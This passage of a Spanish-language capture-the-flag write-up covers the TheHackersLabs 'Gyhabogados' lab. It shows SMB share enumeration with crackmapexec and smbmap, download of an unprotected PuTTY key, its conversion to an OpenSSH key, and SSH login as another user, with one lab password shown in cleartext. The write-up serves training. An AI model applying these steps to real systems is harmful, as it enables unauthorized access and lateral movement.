dean@TheHackersLabs-Gyhabogados:~$ whoami
dean
```

Aquí encontraremos la flag del usuario:
```bash
dean@TheHackersLabs-Gyhabogados:~$ ls
Maildir  user.txt
dean@TheHackersLabs-Gyhabogados:~$ cat user.txt
...
```

<br>

<h2 id="Stego">Enumeración de Archivos Compartidos del Usuario dean y Aplicando Esteganografia en Imagen</h2>

Revisando los archivos del **usuario dean**, no encontraremos mucho.

Puede que la contraseña de este usuario nos sirva para ver más archivos compartidos:
```bash
crackmapexec smb 192.168.100.150 -u 'dean' -p '**********'
SMB         192.168.100.150 445    THEHACKERSLABS-GYHABOGADOS [*] Windows 6.1 Build 0 (name:THEHACKERSLABS-GYHABOGADOS) (domain:THEHACKERSLABS-GYHABOGADOS) (signing:False) (SMBv1:False)
SMB         192.168.100.150 445    THEHACKERSLABS-GYHABOGADOS [+] THEHACKERSLABS-GYHABOGADOS\dean:**********
```
Si funcionan.

Veamos si podemos ver otro directorio:
```bash
smbmap -H 192.168.100.150 -u 'dean' -p '**********' --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 192.168.100.150:445	Name: gyhabogados.thl     	Status: NULL Session
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	READ ONLY	Printer Drivers
	CONFIDENCIALES                                    	READ ONLY	Documentos Confidenciales de Clientes
	IT_TOOLS                                          	READ ONLY	IT Tools
	RESPALDOS_IT                                      	READ ONLY	Respaldos IT
	IPC$                                              	NO ACCESS	IPC Service (Samba 4.17.12-Debian)
	dean                                              	READ ONLY	Home Directories
[*] Closed 1 connections
```
Ya podemos ver el contenido del directorio **RESPALDOS_IT**.

Veamos qupe hay dentro:
```bash
smbmap -H 192.168.100.150 -u 'dean' -p '**********' -r IT_TOOLS --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 192.168.100.150:445	Name: gyhabogados.thl     	Status: NULL Session
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	READ ONLY	Printer Drivers
	CONFIDENCIALES                                    	READ ONLY	Documentos Confidenciales de Clientes
	IT_TOOLS                                          	READ ONLY	IT Tools
	./IT_TOOLS
	dr--r--r--                0 Sun Dec  8 11:12:50 2024	.
	dr--r--r--                0 Sun Dec  8 11:55:59 2024	..
	fr--r--r--             1458 Sat Dec  7 18:20:46 2024	private_key.ppk
	RESPALDOS_IT                                      	READ ONLY	Respaldos IT
	IPC$                                              	NO ACCESS	IPC Service (Samba 4.17.12-Debian)
	dean                                              	READ ONLY	Home Directories
```
Solo hay una llave privada.

Descarguémosla:
```bash
smbmap -H 192.168.100.150 -u 'dean' -p 'MasterOfPuppets1986' --download IT_TOOLS/private_key.ppk --no-banner
mv 192.168.100.150-IT_TOOLS_private_key.ppk private_key.ppk
```

Si analizamos el archivo, resulta ser una llave privada de **PuTTY**:
```bash
file private_key.ppk
private_key.ppk: PuTTY Private Key File, version 3, algorithm ssh-rsa
```

Podemos obtener un poco más de información usando la herramienta **puttygen**, por ejemplo, la huella digital:
```bash
puttygen private_key.ppk -l
ssh-rsa 2048 SHA256:bE/OC0a4W0YALcfFb3ZMKvbx94oNGvsOvb0CajKFqOY
```
Algo importante, es que no nos pidio meter una contraseña, por lo que es posible modificar esta llave para convertirla en una **llave privada id_rsa** para el **servicio SSH**.

La podemos generar con **puttygen** y le damos los permisos correctos:
```bash
puttygen private_key.ppk -O private-openssh -o id_rsa
chmod 600 id_rsa
```
Ya solo tenemos que averigurar a quien pertenece esta llave.

Probando con varios usuarios, resulta que le pertenece al **usuario john**:
```bash
ssh -i id_rsa john@192.168.100.150
Linux TheHackersLabs-Gyhabogados 6.1.0-28-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.119-1 (2024-11-22) x86_64
...
Last login: Fri Oct  3 02:53:26 2025
john@TheHackersLabs-Gyhabogados:~$ whoami
john
```

<br>

<h2 id=""></h2>

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```




<br>
<br>
<div style="position: relative;">
  <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
</div>


links


<br>
# FIN

<footer id="myFooter">
    <!-- Footer para eliminar el botón -->
</footer>

<style>
        #backToIndex {
                display: none;
                position: fixed;
                left: 87%;
                top: 90%;
                z-index: 2000;
                background-color: #81fbf9;
                border-radius: 10px;
                border: none;
                padding: 4px 6px;
                cursor: pointer;
        }
</style>

<a id="backToIndex" href="#Indice">
        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
</a>

<script>
    window.onscroll = function() { showButton() };

    function showButton() {
        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
        const indicePosition = document.getElementById("Indice").offsetTop;
        const footerPosition = document.getElementById("myFooter").offsetTop;
        const windowHeight = window.innerHeight;

        const button = document.getElementById("backToIndex");

        // Mostrar el botón si el usuario ha bajado al índice
        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
            button.style.display = "block";
            button.style.position = "fixed";
            button.style.top = "90%";
        } else {
            button.style.display = "none";
        }
    }
</script>
